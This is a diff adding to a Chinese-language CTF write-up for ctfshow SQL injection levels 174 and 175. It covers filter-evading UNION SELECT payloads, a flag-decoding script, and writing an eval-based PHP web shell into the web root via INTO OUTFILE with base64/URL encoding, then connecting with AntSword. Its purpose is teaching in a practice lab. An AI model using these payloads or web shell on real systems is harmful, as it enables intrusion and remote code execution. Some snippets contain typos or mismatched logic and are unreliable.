@@ -99,3 +99,66 @@ id查询处输入
 ```
 
 这段代码的作用是：如果经过 `json_encode` 编码后的 `$ret` 中不包含 `'flag'` （不区分大小写）以及任何数字（0 到 9），就将 `$ret` 数组中的 `'msg'` 键对应的值设置为 `'查询成功'` 。
+
+此处可以使用`replace()`将结果中的数字替换为数字键上方的符号，具体语句为：
+
+```
+` unionselect'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,'g'),1,'h'),2,'i'),3,'j'),4,'k'),5,'l'),6,'m'),7,'n'),8,'o'),9,'p') from ctfshow_user4 -- qwe
+```
+
+得到被转化后的flag
+
+可以使用脚本对其进行转化：
+
+```
+flag = flag = 'ctfshow{bokglnof-lfle-knag-pnlk-bbibdmkpjmdb}'
+for i in range(10):
+    flag = flag.replace(chr(ord(str(i)) + 55),str(i))
+    print(str(i),chr(ord(str(i)) + 55))
+    print(flag)
+```
+
+
+
+#### 175
+
+返回逻辑是
+
+```
+//检查结果是否有flag
+    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
+      $ret['msg']='查询成功';
+    }
+```
+
+`/[\x00-\x7f]/i` 匹配的是 ASCII 字符范围内的字符（包括控制字符），不区分大小写。
+
+[x00-x7f] 匹配ASCII值从0-127的字符
+0-127表示单字节字符：数字，英文字符，半角符号，以及某些控制字符。
+也就说，是以上字符的不会在页面显示出来。
+那我们换个思路，不让在页面显示，写在某个文件里，然后查看文件内容。
+
+此处直接写解题过程：
+
+写入
+
+```
+999' union select 1,"<?php @eval($_POST['CMD']);?>" into outfile 'var/www/html/1.php
+```
+
+发现回显错误
+
+于是将`<?php eval($_POST[1]);?>`在bp中先进行base64编码，后将其base64编码再进行URL编码，放回原句：
+
+```
+99' union select 1,from_base64(%50%44%39%77%61%48%41%67%51%47%56%32%59%57%77%6f%4a%46%39%51%54%31%4e%55%57%79%64%44%54%55%51%6e%58%53%6b%37%50%7a%34%3d) into outfile 'var/www/html/1.php
+```
+
+并用bp进行抓包重发，然后在url后输入`/1.php`检验是否成功，再在hackbar中使用post请求输入`1=phpinfo()`发现可以显示
+
+然后用蚁剑进行连接，连接成功后右键进行数据操作，数据类型为`MYSQLI`,用户和密码皆为`root`。
+
+即可找到flag。
+
+
+
